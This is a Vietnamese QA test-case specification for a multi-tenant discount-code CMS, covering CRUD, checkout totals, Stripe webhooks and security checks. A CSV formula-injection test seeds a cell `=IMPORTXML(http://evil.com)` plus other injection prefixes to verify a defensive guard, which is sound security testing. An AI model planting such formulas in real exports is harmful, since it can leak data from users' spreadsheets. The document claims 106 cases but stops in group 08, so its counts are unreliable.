# Quyết Định Kiểm Thử & Testcase Chi Tiết: F33 - Discount Setting CMS

> **Phiên bản:** 1.0 | **Cập nhật:** 2026-06-10 | **Thực hiện:** QA Team
> **Nguồn tham chiếu:** `docs/prd/F33-discount-cms.md`, `docs/stories/F33-discount-cms-stories.md`, `docs/design/F33-discount-cms-design.md`
> **GitHub Issue:** [#1114](https://github.com/primeproduction/ech-prime-web-v2/issues/1114)
> **Kỹ thuật:** BDD (Gherkin), BVA, State Transition (usageCount + status + expiresAt), Concurrency (atomic redeem), Security (IDOR/CSRF/Formula Injection), Payload CMS DB Assertions, Stripe Webhook Idempotency
> **Tổng TCs:** 106 (TC-F33-01-01 → TC-F33-10-20)

---

## 1. Mục Tiêu

Bộ testcase này kiểm thử đầy đủ F33 — hệ thống quản lý mã giảm giá multi-tenant cho merchant:

- **US-F33-01:** Tạo discount loại percentage hoặc fixed amount, kèm usage limit và date range.
- **US-F33-02:** Sửa thông tin discount (trừ `usageCount` read-only).
- **US-F33-03:** Xoá discount, giữ nguyên `discount_usage_history`.
- **US-F33-04:** Danh sách discount với search + filter (status, type) + pagination.
- **US-F33-05:** Export danh sách discount thành CSV, tenant-scoped, cap 10k rows.
- **US-F33-06:** Áp dụng discount tại checkout COD/QR-banking.
- **US-F33-07:** Áp dụng discount tại checkout Stripe (gateway-agnostic, charge đúng `finalAmount`).
- **US-F33-08:** Xem lịch sử sử dụng discount per order (immutable).

**Business Rule cốt lõi:**
- `finalAmount = (subtotal − discountAmount) + shipping + tax` (BR-02 — discount chỉ trên subtotal).
- Silent reject 4 cases: expired / at-limit / inactive / wrong-tenant → order vẫn đặt được giá full (BR-03).
- Code unique **per tenant**, UPPERCASE canonical, so sánh case-insensitive (BR-04, BR-05).
- Gateway-agnostic: COD/QR/Stripe dùng chung `computeOrderTotal()`, KHÔNG dùng Stripe Coupon object (BR-06).
- `discount_usage_history` immutable — audit trail (BR-07).
- `usageCount` read-only ở admin, hook tăng atomic khi order thành công (BR-08).

---

## 2. Test Environment

| Thông số | Yêu cầu |
|---|---|
| Môi trường | Staging / Pre-Production |
| Trình duyệt | Chrome v120+, Safari iOS, Firefox |
| Thiết bị | Desktop 1280px, Mobile iPhone 14 Pro 375px |
| Backend | Payload CMS 3 + PostgreSQL (Neon) |
| Test runner | Vitest 3 (unit + integration) + Playwright (E2E) |
| Stripe | Test keys + webhook secret + Stripe CLI cho replay |
| Auth | 2 tenant test (tenantA, tenantB), 1 super-admin, 1 customer |
| Test data | Seed 7 discounts coverage trạng thái: active, inactive, expired, future, at-limit, unlimited, cross-tenant collision |
| SLA | API checkout < 800ms (P95); CSV export < 5s với 10k rows |
| Currency | RM (Malaysia), lưu DB bằng **sen** (đơn vị nhỏ nhất) |
| Timezone | `Asia/Kuala_Lumpur` cho mọi date display/normalization |

---

## 3. Scope Kiểm Thử

### In Scope
- Discount CRUD (admin Payload): create/edit/delete/list/search/filter.
- Validation: percentage 0–100, fixed ≥ 0, code unique per tenant + UPPERCASE, date range.
- Checkout apply: COD, QR-banking, Stripe — qua shared `computeOrderTotal()`.
- Silent reject 4 case: expired / at-limit / inactive / wrong-tenant.
- Usage tracking: atomic increment + insert history row, idempotent on orderId.
- CSV export: 9 columns, tenant-scoped, cap 10k, formula-injection guard.
- Email receipt hiển thị dòng discount khi applied.
- Security: IDOR, race condition, usageCount integrity, immutable history.

### Out of Scope (F33)
- Subscription-tier promo codes (TC-F15.14–17 → thuộc F15 platform super-admin).
- Affiliate / referral codes; email coupon distribution.
- Code stacking, per-customer usage limit, free-shipping type.
- Auto-apply cart rules; coupon stacking.

---

## 4. Unified Test Cases

---

### NHÓM 01 — US-F33-01: Tạo discount với loại percentage hoặc fixed (12 TCs)

| ID | Ref | Loại | Tiêu Đề | Các Bước Thực Hiện | Kết Quả Mong Đợi | Mức Độ | AUTO |
|:---|:---|:---|:---|:---|:---|:---:|:---:|
| **TC-F33-01-01** | `AC-1 US-F33-01`, `FR-04`, `FR-06` | `[Positive]` | Tạo percentage discount thành công | 1. Vào Payload admin → Discounts → `[Create Discount]`.<br>2. Nhập: Code=`SUMMER50`, Type=`Percentage`, Value=`50`, Status=`Active`.<br>3. Click `[Save]`.<br>4. Query DB. | **GIVEN** form discount empty<br>**WHEN** save với value=50<br>**THEN** record lưu thành công, `code='SUMMER50'`, `value=50`, `usageCount=0`, `status='active'`. | Blocker | [x] |
| **TC-F33-01-02** | `AC-2 US-F33-01`, `BR-01` | `[Positive]` | Tạo fixed discount lưu giá trị sen đúng | 1. Form create discount.<br>2. Type=`Fixed`, Value=`2500` (= RM 25.00).<br>3. Save.<br>4. Query DB. | - `value=2500` (sen) lưu đúng.<br>- UI hiển thị label "sen" hoặc "RM" để rõ unit.<br>- List view hiển thị `RM 25.00`. | Blocker | [x] |
| **TC-F33-01-03** | `AC-1 US-F33-01`, `FR-06` | `[Negative]` | Percentage value > 100 → reject inline | 1. Type=Percentage, Value=`150`.<br>2. Submit. | - Error: `"Percentage must be between 0 and 100"`.<br>- Form không close, không gọi POST.<br>- Field highlight red. | Blocker | [x] |
| **TC-F33-01-04** | `AC-1 US-F33-01`, `FR-06` | `[Negative]` | Percentage value < 0 → reject | 1. Type=Percentage, Value=`-5`.<br>2. Submit. | - Error: `"Percentage must be between 0 and 100"`.<br>- Không lưu DB. | High | [x] |
| **TC-F33-01-05** | `AC-2 US-F33-01`, `FR-06` | `[Negative]` | Fixed value < 0 → reject | 1. Type=Fixed, Value=`-100`.<br>2. Submit. | - Error: `"Fixed amount must be ≥ 0"`.<br>- Không lưu DB. | High | [x] |
| **TC-F33-01-06** | `AC-3 US-F33-01`, `BR-04` | `[Negative]` | Trùng code cùng tenant → reject | 1. Tenant A đã có `SUMMER50`.<br>2. User cùng tenant A tạo lại `SUMMER50`.<br>3. Submit. | - Error: `"This code is already in use for your tenant"`.<br>- Hint: `"Try a different code or append a number"`.<br>- Không lưu DB. | Blocker | [x] |
| **TC-F33-01-07** | `AC-3 US-F33-01`, `BR-04` | `[Positive]` | Cùng code, KHÁC tenant → cho phép | 1. Tenant A có `SUMMER50`.<br>2. Tenant B tạo `SUMMER50`.<br>3. Save.<br>4. Query DB. | - Tenant B record lưu thành công.<br>- DB có 2 row độc lập (partial unique `(tenant_id, code)`).<br>- Không conflict. | Blocker | [x] |
| **TC-F33-01-08** | `AC-5 US-F33-01`, `BR-05` | `[Positive]` | Code normalize trim + UPPERCASE | 1. Nhập code = `"  summer50  "` (có spaces).<br>2. Save.<br>3. Query DB. | - DB lưu `code = 'SUMMER50'`.<br>- List view hiển thị `SUMMER50`.<br>- Không có space ở đầu/cuối. | Blocker | [x] |
| **TC-F33-01-09** | `AC-4 US-F33-01`, `FR-05` | `[Negative]` | startsAt >= expiresAt → reject | 1. startsAt=`2026-08-31`, expiresAt=`2026-06-01`.<br>2. Save. | - Error: `"Start date must be before expiry date"`.<br>- Form remain open. | High | [x] |
| **TC-F33-01-10** | `AC-4 US-F33-01` | `[Positive]` | Cả 2 date blank → save OK (always available) | 1. startsAt=null, expiresAt=null.<br>2. Save.<br>3. Query DB. | - Save thành công.<br>- DB lưu cả 2 field = null.<br>- Discount luôn áp dụng được (không date boundary). | High | [x] |
| **TC-F33-01-11** | `Additional Criteria`, `FR-04` | `[Positive]` | Default values khi create | 1. Form create empty.<br>2. Save với code + value tối thiểu. | - `usageCount = 0`, `usageLimit = null` (unlimited), `status = active` (default). | Medium | [x] |
| **TC-F33-01-12** | `Additional Criteria` | `[Negative]` | Description > 500 chars → reject | 1. Description = `'x'.repeat(501)`.<br>2. Save. | - Error: `"Description max 500 characters"`.<br>- Không lưu DB. | Medium | [x] |

---

### NHÓM 02 — US-F33-02: Sửa thông tin discount (7 TCs)

| ID | Ref | Loại | Tiêu Đề | Các Bước Thực Hiện | Kết Quả Mong Đợi | Mức Độ | AUTO |
|:---|:---|:---|:---|:---|:---|:---:|:---:|
| **TC-F33-02-01** | `AC-1 US-F33-02`, `FR-07` | `[Positive]` | Sửa code/type/value/status/dates/limit thành công | 1. Open edit form discount `SUMMER50`.<br>2. Đổi value 50 → 30.<br>3. Save. | - DB lưu `value=30`.<br>- Các field khác không đổi.<br>- List view update. | Blocker | [x] |
| **TC-F33-02-02** | `AC-1 US-F33-02`, `FR-07` | `[Positive]` | Field `usageCount` hiển thị read-only ở edit form | 1. Open edit form discount đã có `usageCount=3`.<br>2. Inspect DOM. | - Field `usageCount` hiển thị `3` (read-only, disabled hoặc grayed out).<br>- Không thể type/edit. | Blocker | [x] |
| **TC-F33-02-03** | `AC-4 US-F33-02`, `BR-08` | `[Security]` | PATCH với `usageCount` trong body → field bị strip | 1. PATCH `/api/collections/discounts/42` với body `{ code: 'X', usageCount: 9999 }`.<br>2. Query DB. | - HTTP 200.<br>- `code='X'` updated.<br>- `usageCount` GIỮ NGUYÊN giá trị cũ (không = 9999).<br>- Hook chặn field. | Blocker | [ ] |
| **TC-F33-02-04** | `AC-2 US-F33-02` | `[Negative]` | Edit value percentage > 100 → reject (same as create) | 1. Open edit `SUMMER50` (Type=Percentage, Value=50).<br>2. Đổi value → 150.<br>3. Save. | - Error: `"Percentage must be between 0 and 100"`.<br>- Form open, không update DB. | High | [x] |
| **TC-F33-02-05** | `AC-3 US-F33-02`, `BR-04` | `[Negative]` | Rename code → trùng code cùng tenant → reject | 1. Tenant A có 2 discount: `A1`, `A2`.<br>2. Edit `A2` → rename code → `A1`.<br>3. Save. | - Error: `"This code is already in use"`.<br>- Code `A2` giữ nguyên trong DB. | Blocker | [x] |
| **TC-F33-02-06** | `AC-3 US-F33-02` | `[Positive]` | Rename code → trùng code KHÁC tenant → cho phép | 1. Tenant A có `SUMMER50`.<br>2. Tenant B có `WINTER20`.<br>3. Tenant B rename `WINTER20` → `SUMMER50`.<br>4. Save. | - Save thành công.<br>- DB có 2 row độc lập. | High | [x] |
| **TC-F33-02-07** | `AC-2 US-F33-02` | `[Negative]` | Edit đổi startsAt >= expiresAt → reject | 1. Edit discount có dates.<br>2. Đổi startsAt sau expiresAt.<br>3. Save. | - Error: `"Start date must be before expiry date"`.<br>- Form open. | High | [x] |

---

### NHÓM 03 — US-F33-03: Xoá discount (4 TCs)

| ID | Ref | Loại | Tiêu Đề | Các Bước Thực Hiện | Kết Quả Mong Đợi | Mức Độ | AUTO |
|:---|:---|:---|:---|:---|:---|:---:|:---:|
| **TC-F33-03-01** | `AC-1 US-F33-03`, `FR-08` | `[Positive]` | Xoá discount → confirm dialog → row biến mất | 1. List view, click `[Delete]` row `SUMMER50`.<br>2. Dialog `"Delete discount 'SUMMER50'?"`.<br>3. Confirm `[Delete]`. | - HTTP 204.<br>- Row biến mất khỏi list.<br>- Payload audit log record deletion. | High | [x] |
| **TC-F33-03-02** | `AC-1 US-F33-03` | `[Positive]` | Cancel dialog xoá → discount giữ nguyên | 1. Click delete.<br>2. Dialog hiện.<br>3. Click `[Cancel]`. | - Dialog đóng.<br>- Discount vẫn còn trong list. | Medium | [x] |
| **TC-F33-03-03** | `AC-2 US-F33-03`, `BR-07` | `[Positive]` | Xoá discount → `discount_usage_history` rows vẫn còn | 1. Discount `OLD` có 5 history rows.<br>2. Delete `OLD`.<br>3. Query `discount_usage_history WHERE discountId = OLD.id`. | - HTTP 204 delete OK.<br>- 5 history rows VẪN tồn tại (FK preserved).<br>- Reports lịch sử vẫn render được. | Blocker | [x] |
| **TC-F33-03-04** | `Additional Criteria US-F33-03` | `[Security]` | Non-tenant-owner xoá discount của tenant khác → 403 | 1. Tenant A có discount.<br>2. Tenant B user gọi DELETE `/api/collections/discounts/<idA>`.<br>3. Check response. | - HTTP 403 Forbidden.<br>- Discount của tenant A không bị xoá. | Blocker | [x] |

---

### NHÓM 04 — US-F33-04: Danh sách + search + filter + pagination (8 TCs)

| ID | Ref | Loại | Tiêu Đề | Các Bước Thực Hiện | Kết Quả Mong Đợi | Mức Độ | AUTO |
|:---|:---|:---|:---|:---|:---|:---:|:---:|
| **TC-F33-04-01** | `AC-1 US-F33-04`, `FR-01` | `[Positive]` | List columns đúng order: Code/Type/Value/Status/Usage/Expires/Actions | 1. Open Discounts collection.<br>2. Inspect column headers + data 1 row. | - Columns đúng order PRD FR-01.<br>- Row hiện format: `SUMMER50 | Percentage | 50% | Active | 3/10 | 2026-08-31 | [Edit] [Delete]`. | High | [x] |
| **TC-F33-04-02** | `AC-1 US-F33-04`, Design §4.2 | `[UI]` | Usage indicator: progress bar đỏ khi at-limit, amber khi ≥80% | 1. Seed: discount A `usageCount=10/10`, discount B `8/10`, discount C `3/10`.<br>2. Quan sát progress bar trong list view. | - A: bar màu **đỏ** + label "(at limit)".<br>- B: bar màu **amber**.<br>- C: bar mặc định (xanh/slate). | High | [x] |
| **TC-F33-04-03** | `AC-1 US-F33-04`, Design §4.2 | `[UI]` | usageLimit null → hiển thị "∞ unlimited" | 1. Seed discount `usageLimit=null, usageCount=8`.<br>2. List view. | - Cột Usage hiển thị `8 / ∞` hoặc "unlimited", không có progress bar. | Medium | [x] |
| **TC-F33-04-04** | `AC-2 US-F33-04`, `FR-02` | `[Positive]` | Search by code case-insensitive | 1. Seed có `SUMMER50`, `SUMMERSALE`, `WINTER20`.<br>2. Nhập search box `summer`.<br>3. Quan sát kết quả. | - 2 rows match: `SUMMER50`, `SUMMERSALE`.<br>- Không có `WINTER20`. | High | [x] |
| **TC-F33-04-05** | `AC-2 US-F33-04`, `FR-02` | `[Positive]` | Search by description case-insensitive | 1. Discount A description = `"Summer campaign 2026"`.<br>2. Search `summer`. | - Discount A match qua description.<br>- Search trên cả code OR description. | High | [x] |
| **TC-F33-04-06** | `AC-3 US-F33-04`, `FR-03` | `[Positive]` | Filter Status=Active + Type=Percentage → AND logic | 1. Seed: 4 discounts (2 active percentage, 1 active fixed, 1 inactive percentage).<br>2. Filter Status=Active + Type=Percentage. | - Kết quả: 2 discounts (active + percentage).<br>- Inactive percentage không hiện.<br>- Active fixed không hiện. | Blocker | [x] |
| **TC-F33-04-07** | `AC-4 US-F33-04` | `[Positive]` | Pagination giữ state search/filter qua trang | 1. Seed 50+ discounts.<br>2. Apply search `SUMMER` + filter active.<br>3. Sang page 2, page 3.<br>4. Quay lại page 1. | - URL/state giữ search + filter qua các trang.<br>- Page numbering chính xác. | High | [x] |
| **TC-F33-04-08** | `AC-2 US-F33-04` | `[Edge]` | Search empty → toàn bộ discounts hiện lại | 1. Apply search có kết quả.<br>2. Clear search input. | - Full list reappear.<br>- Filter (nếu có) vẫn được áp dụng. | Medium | [x] |

---

### NHÓM 05 — US-F33-05: Export danh sách discount thành CSV (12 TCs)

| ID | Ref | Loại | Tiêu Đề | Các Bước Thực Hiện | Kết Quả Mong Đợi | Mức Độ | AUTO |
|:---|:---|:---|:---|:---|:---|:---:|:---:|
| **TC-F33-05-01** | `AC-1 US-F33-05`, `FR-14` | `[Positive]` | Export CSV trả 9 columns đúng order | 1. Tenant A có 3 discounts.<br>2. Click `[Export CSV]` → `GET /api/v1/discounts/export`.<br>3. Parse CSV. | - 9 columns đúng order: `Code, Type, Value, Status, Usage Limit, Usage Count, Started At, Expires At, Created At`.<br>- 3 row dữ liệu. | High | [x] |
| **TC-F33-05-02** | `AC-1 US-F33-05` | `[Positive]` | Tên file `discounts-{tenant}-{date}.csv` | 1. Tenant `acme`, ngày export 2026-06-10.<br>2. Trigger export.<br>3. Inspect Content-Disposition header. | - File name: `discounts-acme-2026-06-10.csv`.<br>- Header: `Content-Disposition: attachment; filename="discounts-acme-2026-06-10.csv"`. | Medium | [x] |
| **TC-F33-05-03** | `AC-2 US-F33-05` | `[Positive]` | Dates format ISO 8601 `YYYY-MM-DD HH:MM:SS` | 1. Discount có startsAt=2026-06-01, expiresAt=2026-08-31.<br>2. Export CSV.<br>3. Inspect date cells. | - startsAt: `2026-06-01 00:00:00`.<br>- expiresAt: `2026-08-31 23:59:59`.<br>- createdAt format đồng nhất. | Medium | [x] |
| **TC-F33-05-04** | `AC-3 US-F33-05`, `FR-15` | `[Security]` | Tenant-scoped: tenant A export KHÔNG leak tenant B | 1. Tenant A có 3 discounts, tenant B có 2 discounts.<br>2. Tenant A login → export.<br>3. Parse CSV. | - CSV chỉ chứa 3 row của tenant A.<br>- Không có row nào của tenant B. | Blocker | [x] |
| **TC-F33-05-05** | `AC-3 US-F33-05`, `FR-15` | `[Positive]` | Super-admin export `?tenantId=123` → chỉ tenant 123 | 1. Super-admin login.<br>2. `GET /api/v1/discounts/export?tenantId=123`. | - CSV chỉ chứa discounts của tenant 123. | High | [x] |
| **TC-F33-05-06** | `AC-3 US-F33-05` | `[Negative]` | tenantId không tồn tại → 400 Bad Request | 1. Super-admin gọi `?tenantId=99999` (invalid). | - HTTP 400.<br>- Body: error message rõ ràng. | Medium | [x] |
| **TC-F33-05-07** | `AC-4 US-F33-05`, Security | `[Security]` | Unauthenticated → 401 | 1. Gọi `GET /api/v1/discounts/export` không kèm auth header. | - HTTP 401 Unauthorized.<br>- Không stream content. | Blocker | [x] |
| **TC-F33-05-08** | `AC-4 US-F33-05`, `FR-15` | `[Negative]` | Vượt cap 10k rows → 413 + message rõ | 1. Seed 15,000 discounts cho tenant A.<br>2. Export. | - HTTP 413 Payload Too Large.<br>- Body: `"Export limited to 10,000 rows. Please apply date filter first."`.<br>- Không stream CSV. | Blocker | [x] |
| **TC-F33-05-09** | `AC-5 US-F33-05` | `[Security]` | Formula injection guard: cell `=IMPORTXML(...)` được prefix `'` | 1. Seed discount code = `=IMPORTXML(http://evil.com)`.<br>2. Export.<br>3. Inspect CSV cell. | - Cell value: `'=IMPORTXML(http://evil.com)` (prefix single quote).<br>- Excel/Sheets hiển thị as text, không execute. | Blocker | [x] |
| **TC-F33-05-10** | `AC-5 US-F33-05` | `[Security]` | Formula guard cũng cover `+ - @` | 1. Seed code: `+CMD`, `-SUM(A1)`, `@PHISH`.<br>2. Export. | - Tất cả 3 cell được prefix `'`.<br>- Cell `SAFE50` (normal) KHÔNG prefix. | Blocker | [x] |
| **TC-F33-05-11** | `Additional Criteria US-F33-05` | `[Security]` | Header `Cache-Control: private, no-store` | 1. Export CSV.<br>2. Inspect response headers. | - Header có `Cache-Control: private, no-store`.<br>- Không cache CDN/browser (PII safety). | High | [x] |
| **TC-F33-05-12** | `Additional Criteria US-F33-05` | `[Perf]` | Streaming response cho file lớn | 1. Seed 9,000 discounts.<br>2. Export.<br>3. Inspect `Transfer-Encoding`. | - Header: `Transfer-Encoding: chunked`.<br>- Response stream từng chunk, không buffer toàn bộ. | Medium | [ ] |

---

### NHÓM 06 — US-F33-06: Áp dụng discount tại checkout COD/QR (14 TCs)

| ID | Ref | Loại | Tiêu Đề | Các Bước Thực Hiện | Kết Quả Mong Đợi | Mức Độ | AUTO |
|:---|:---|:---|:---|:---|:---|:---:|:---:|
| **TC-F33-06-01** | `AC-1 US-F33-06` | `[UI]` | Field discount code hiện ở checkout COD/QR | 1. Add cart, vào checkout.<br>2. Chọn COD payment.<br>3. Quan sát order summary panel. | - Input `"Discount or promo code"` + button `[Apply]` hiện.<br>- Initial: no discount, subtotal full.<br>- Mobile: input + Apply stack cleanly. | High | [x] |
| **TC-F33-06-02** | `AC-2 US-F33-06`, `FR-09` | `[Positive]` | Apply code valid → discount line hiện, total update | 1. Cart subtotal RM100, shipping RM10, tax RM6.60.<br>2. Apply `SUMMER50` (percentage 50%).<br>3. Click `[Apply]`. | - Dòng: `Discount (50%) −RM50.00`.<br>- Total: `RM66.60` (= (100−50) + 10 + 6.60).<br>- Chip `✓ SUMMER50 applied` + `[Remove]` button hiện. | Blocker | [x] |
| **TC-F33-06-03** | `AC-2 US-F33-06`, `BR-05` | `[Positive]` | Case-insensitive: nhập `summer50` → match `SUMMER50` | 1. Discount lưu code `SUMMER50` trong DB.<br>2. Nhập `summer50` (lowercase) ở checkout.<br>3. Apply. | - Backend normalize input.<br>- Discount apply thành công.<br>- UI hiển thị `SUMMER50 applied`. | Blocker | [x] |
| **TC-F33-06-04** | `AC-3 US-F33-06`, `BR-02` | `[Positive]` | Công thức finalAmount = (subtotal − discount) + shipping + tax | 1. Subtotal=10000 sen, ship=1000, tax=660, discount 50%.<br>2. Apply.<br>3. Inspect order total. | - discountAmount = 5000.<br>- finalAmount = (10000−5000) + 1000 + 660 = **6660 sen** (RM66.60).<br>- KHÔNG trừ discount khỏi shipping/tax. | Blocker | [x] |
| **TC-F33-06-05** | `AC-3 US-F33-06`, `BR-02` | `[Positive]` | Fixed discount RM25 trên subtotal RM100 | 1. Subtotal=10000, shipping=1000, tax=660.<br>2. Apply discount `WELCOME` (fixed value=2500 sen).<br>3. Inspect. | - discountAmount = 2500.<br>- finalAmount = (10000−2500) + 1000 + 660 = **9160 sen**. | High | [x] |
| **TC-F33-06-06** | `BR-02` | `[Edge]` | discountAmount > subtotal → cap, finalAmount KHÔNG âm | 1. Subtotal=5000, shipping=1000, tax=300.<br>2. Apply fixed value=10000 (> subtotal). | - effectiveDiscount = 5000 (cap = subtotal).<br>- finalAmount = 0 + 1000 + 300 = **1300 sen** (≥ 0).<br>- Không có negative total. | Blocker | [x] |
| **TC-F33-06-07** | `AC-4 US-F33-06`, `BR-03`, `FR-10` | `[Negative]` | Code expired → silent reject, order vẫn đặt được giá full | 1. Discount `EXPIRED` (`expiresAt` past, status=active).<br>2. Apply ở checkout.<br>3. Place order. | - KHÔNG có error/toast.<br>- Code field clear hoặc giữ nguyên (không discount line).<br>- Order tạo thành công, `discountAmount=0`, `discountCode=null`, total = giá full.<br>- KHÔNG có row mới trong `discount_usage_history`. | Blocker | [x] |
| **TC-F33-06-08** | `AC-4 US-F33-06`, `BR-03` | `[Negative]` | Code at-limit (usageCount=usageLimit) → silent reject | 1. Discount `LIMIT` (`usageCount=10, usageLimit=10`).<br>2. Apply, place order. | - Silent reject (no error).<br>- Order tạo full price.<br>- `usageCount` vẫn = 10 (không tăng).<br>- Không có history row mới. | Blocker | [x] |
| **TC-F33-06-09** | `AC-4 US-F33-06`, `BR-03` | `[Negative]` | Code inactive → silent reject | 1. Discount `OLD2025` (status=inactive).<br>2. Apply. | - Silent reject.<br>- Order tạo full price. | Blocker | [x] |
| **TC-F33-06-10** | `AC-4 US-F33-06`, `BR-03` | `[Security]` | Code thuộc tenant khác → silent reject | 1. Tenant A có `SECRET50`.<br>2. Customer checkout ở tenant B nhập `SECRET50`. | - Silent reject (resolveDiscount return null).<br>- Order tenant B giá full.<br>- Không leak existence của code tenant A. | Blocker | [x] |
| **TC-F33-06-11** | `AC-4 US-F33-06` | `[Negative]` | Code không tồn tại → silent reject | 1. Apply code `NONEXISTENT_XYZ`. | - Silent reject.<br>- Order tạo full price.<br>- Không có 4xx, không error toast. | High | [x] |
| **TC-F33-06-12** | `AC-5 US-F33-06` | `[Positive]` | Remove discount → total revert giá full | 1. Apply `SUMMER50`.<br>2. Click `[Remove Discount]`.<br>3. Inspect total. | - Discount line biến mất.<br>- Total = subtotal + shipping + tax (full).<br>- Code field clear hoặc enabled lại. | High | [x] |
| **TC-F33-06-13** | `FR-12`, `BR-08` | `[Positive]` | Order success → atomic increment usageCount + insert history | 1. Discount `SUMMER50` usageCount=3.<br>2. Apply, place order success.<br>3. Query DB. | - `usageCount = 4`.<br>- 1 row mới trong `discount_usage_history`: { discount, order, amountApplied, customerEmail, usedAt }.<br>- Cả 2 update commit trong cùng transaction. | Blocker | [x] |
| **TC-F33-06-14** | `Additional Criteria US-F33-06`, `FR-13` | `[Positive]` | Email receipt hiển thị dòng discount khi applied | 1. Apply `SUMMER50` (50% off RM100).<br>2. Place order success.<br>3. Inspect email rendered. | - Email có dòng: `Discount: −RM50.00`.<br>- Format đồng nhất với UI checkout.<br>- Order # + customer email đúng. | High | [x] |

---

### NHÓM 07 — US-F33-07: Áp dụng discount tại checkout Stripe (10 TCs)

| ID | Ref | Loại | Tiêu Đề | Các Bước Thực Hiện | Kết Quả Mong Đợi | Mức Độ | AUTO |
|:---|:---|:---|:---|:---|:---|:---:|:---:|
| **TC-F33-07-01** | `AC-1 US-F33-07` | `[UI]` | Field discount code hiện ở Stripe checkout (UX y hệt COD/QR) | 1. Cart, chọn Stripe payment.<br>2. Quan sát checkout form. | - Input `"Discount code"` + `[Apply]` hiện y hệt COD/QR (US-F33-06 AC-1).<br>- Initial: no discount. | High | [x] |
| **TC-F33-07-02** | `AC-2 US-F33-07`, `BR-06`, `FR-11` | `[Positive]` | Stripe charge đúng finalAmount từ shared computeOrderTotal() | 1. Subtotal=10000, ship=1000, tax=660, discount 50%.<br>2. Apply `SUMMER50` ở Stripe checkout.<br>3. Inspect Stripe session.<br>4. Complete payment. | - Backend gọi `computeOrderTotal()` → finalAmount=6660 sen.<br>- Stripe session `amount_total = 6660` (RM66.60).<br>- Stripe charge đúng RM66.60.<br>- KHÔNG dùng Stripe Coupon object. | Blocker | [x] |
| **TC-F33-07-03** | `AC-3 US-F33-07`, `BR-06` | `[Positive]` | Stripe line items sum chính xác = finalAmount, no negative item | 1. finalAmount=6660 sen sau discount.<br>2. Inspect Stripe session.line_items. | - sum(line_items.amount) === 6660.<br>- Không có item nào amount < 0.<br>- Items pro-rated (products + shipping + tax điều chỉnh). | Blocker | [x] |
| **TC-F33-07-04** | `BR-06` | `[Edge]` | Round sen lẻ: discount 33% → tổng line items vẫn khớp finalAmount | 1. Subtotal=10000, discount 33%.<br>2. Apply Stripe.<br>3. Inspect session. | - finalAmount round consistently (3333 → 3333 sen discount).<br>- sum(line_items) === finalAmount (off-by-1 protection).<br>- Không có amount lẻ → checkout fail. | High | [ ] |
| **TC-F33-07-05** | `AC-4 US-F33-07`, `BR-03` | `[Negative]` | Stripe code expired → silent reject, charge full price | 1. Code `EXPIRED`.<br>2. Apply Stripe, complete payment. | - Stripe session = full price.<br>- Order tạo `discountAmount=0`.<br>- Không có history row. | Blocker | [x] |
| **TC-F33-07-06** | `AC-5 US-F33-07`, `FR-12` | `[Positive]` | Stripe webhook success → atomic redeem + recordUsage | 1. Order Stripe payment thành công.<br>2. Stripe webhook `payment_intent.succeeded` fire.<br>3. Query DB. | - `usageCount` tăng 1.<br>- 1 row history mới (idempotent).<br>- `order.discount`, `order.discountCode`, `order.discountAmount` đúng snapshot.<br>- `order.status = paid`. | Blocker | [x] |
| **TC-F33-07-07** | `FR-12`, `BR-08` | `[Concurrency]` | Stripe webhook retry cùng orderId → KHÔNG duplicate history/usageCount | 1. Webhook gửi `payment_intent.succeeded` cho orderId=42.<br>2. Stripe retry cùng event (simulate).<br>3. Query DB. | - `discount_usage_history` chỉ 1 row cho orderId=42.<br>- `usageCount` chỉ tăng 1 (không 2).<br>- Idempotent on orderId. | Blocker | [x] |
| **TC-F33-07-08** | `AC-5 US-F33-07` | `[Positive]` | Email receipt Stripe hiển thị discount line (parity với COD/QR) | 1. Stripe order với discount thành công.<br>2. Inspect email. | - Dòng `Discount: −RM50.00`.<br>- Format đồng nhất giữa 3 gateway. | High | [x] |
| **TC-F33-07-09** | `BR-06`, `Additional Criteria` | `[Regression]` | Gateway parity: cùng cart + discount → COD/QR/Stripe ra cùng finalAmount | 1. Cart cố định (subtotal 20000, ship 1500, tax 1320), discount `PARITY50` (50%).<br>2. Checkout COD → record total.<br>3. Checkout QR → record total.<br>4. Checkout Stripe → record total. | - Cả 3 finalAmount === 12820 sen.<br>- order.discountAmount === 10000 sen cho cả 3.<br>- Stripe session.amount_total = 12820. | Blocker | [x] |
| **TC-F33-07-10** | `Additional Criteria US-F33-07` | `[Negative]` | Stripe payment failed → KHÔNG increment usageCount | 1. Apply discount, complete Stripe checkout.<br>2. Stripe trả `payment_intent.failed` webhook. | - Order status = failed/cancelled.<br>- `usageCount` KHÔNG tăng.<br>- KHÔNG có row history.<br>- Không leak seat. | Blocker | [x] |

---

### NHÓM 08 — US-F33-08: Xem lịch sử sử dụng discount per order (7 TCs)

| ID | Ref | Loại | Tiêu Đề | Các Bước Thực Hiện | Kết Quả Mong Đợi | Mức Độ | AUTO |
|:---|:---|:---|:---|:---|:---|:---:|:---:|
| **TC-F33-08-01** | `AC-1 US-F33-08`, `FR-13` | `[Positive]` | Collection "Discount Usage History" hiện trong admin với 5 columns | 1. Vào admin, navigate "Discount Usage History".<br>2. Inspect list view. | - 5 columns: Discount Code, Amount Applied, Order #, Customer Email, Used Date.<br>- Sorted by usedAt desc (newest first). | High | [x] |
| **TC-F33-08-02** | `AC-2 US-F33-08`, `FR-12` | `[Positive]` | Row snapshot đầy đủ field per order | 1. Place order với `SUMMER50` (50% off RM100).<br>2. Query latest history row.<br>3. Inspect row. | - discount=SUMMER50 ref, order=#1001, amountApplied=5000 (sen), customerEmail=`customer@example.com`, usedAt timestamp.<br>- Row hiển thị: `SUMMER50 | Percentage 50% | RM50.00 | #1001 | customer@example.com | 2026-05-29 14:30`. | Blocker | [x] |
| **TC-F33-08-03** | `AC-3 US-F33-08`, `BR-07` | `[Security]` | Tenant-scoped: merchant A KHÔNG thấy history merchant B | 1. Tenant A có 3 history rows, tenant B có 2.<br>2. Tenant A login, vào History collection. | - List chỉ 3 row của tenant A.<br>- Không thấy row của tenant B. | Blocker | [x] |
| **TC-F33-08-04** | `AC-3 US-F33-08` | `[Positive]` | Super-admin thấy toàn bộ history mọi tenant | 1. Super-admin login.<br>2. Vào History collection. | - Hiển thị toàn bộ 5 rows (tenant A + B).<br>- Có column phân biệt tenant. | Medium | [x] |
| **TC-F33-08-05** | `AC-4 US-F33-08` | `[Positive]` | Search by code "SUMMER" → filter đúng | 1. History có rows: SUMMER50, WELCOME, OLD2025.<br>2. Search `SUMMER`. | - Chỉ row SUMMER50 hiện. | Medium | [x] |
